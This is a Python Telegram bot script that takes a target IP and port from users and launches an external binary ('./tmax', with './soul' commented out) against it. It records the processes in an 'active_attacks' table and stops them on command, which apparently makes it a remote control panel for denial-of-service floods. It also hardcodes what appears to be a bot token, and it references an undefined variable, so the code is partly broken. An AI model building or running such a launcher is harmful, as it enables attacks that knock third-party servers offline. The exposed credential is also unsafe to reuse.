import telebot
import subprocess
import threading
import os
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# WARNING: Never share your token publicly. Revoke the token below in BotFather immediately.
TOKEN = '8827891490:AAHDwpjPyItD4Omxpz_hfkaw6P0TqqUkJN0' 

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
userdetails = {}
active = {}

if os.path.exists('./tmax'):
    os.chmod('./tmax', 0o755)


def runcommand_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./tmax", target_ip, str(target_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
          #  process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "200"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[(user_id, target_ip, target_port)] = process.pid
        elif action == 2:
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
    except Exception as e:
        send_main_buttons(user_id, 0)
        
def send_main_buttons(chat_id, action):
    markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
    
    if action == 0:
        markup.add(KeyboardButton("Lest Go ⚠️"))
        bot.send_message(chat_id, "Main Menu:", reply_markup=markup)
    elif action == 1:
        markup.add(KeyboardButton("START ✅ 🚀"))
        bot.send_message(chat_id, "Target set. Ready to start:", reply_markup=markup)
    elif action == 2:
        markup.add(KeyboardButton("STOP ❌"))
        bot.send_message(chat_id, "Process running:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Lest Go ⚠️")
def command(message):
    bot.reply_to(message, "*Please provide data (Format: IP Port)*", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_ip_port)

def process_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "*Wrong format.*", parse_mode="Markdown")
            send_main_buttons(message.chat.id, 0)
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.reply_to(message, f"*Port {target_port} is blocked.*", parse_mode="Markdown")
            send_main_buttons(message.chat.id, 0)
            return

        userdetails[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message.chat.id, 1)
    except Exception as e:
        bot.reply_to(message, "*Wrong format*", parse_mode="Markdown")
        send_main_buttons(message.chat.id, 0)

@bot.message_handler(func=lambda message: message.text == "START ✅ 🚀")
def start(message):
    details = userdetails.get(message.from_user.id)
    if details:
        target_ip, target_port = details
        runcommand_sync(message.from_user.id, target_ip, target_port, 1)
        bot.reply_to(message, f"*Host: {target_ip} Port: {target_port} started.*", parse_mode="Markdown")
        send_main_buttons(message.chat.id, 2)
    else:
        bot.reply_to(message, "*No target specified.*", parse_mode="Markdown")
        send_main_buttons(message.chat.id, 0)
        
@bot.message_handler(func=lambda message: message.text == "STOP ❌")
def stop(message):
    details = userdetails.get(message.from_user.id)
    if details:
        target_ip, target_port = details
        runcommand_sync(message.from_user.id, target_ip, target_port, 2)
        bot.reply_to(message, f"*Host: {target_ip} Port: {target_port} stopped.*", parse_mode="Markdown")
        userdetails.pop(message.from_user.id, None)
    else:
        bot.reply_to(message, "*No active process to stop.*", parse_mode="Markdown")
    
    send_main_buttons(message.chat.id, 0)
    
@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message.chat.id, 0)
    
if __name__ == "__main__":
    bot.polling(none_stop=True)
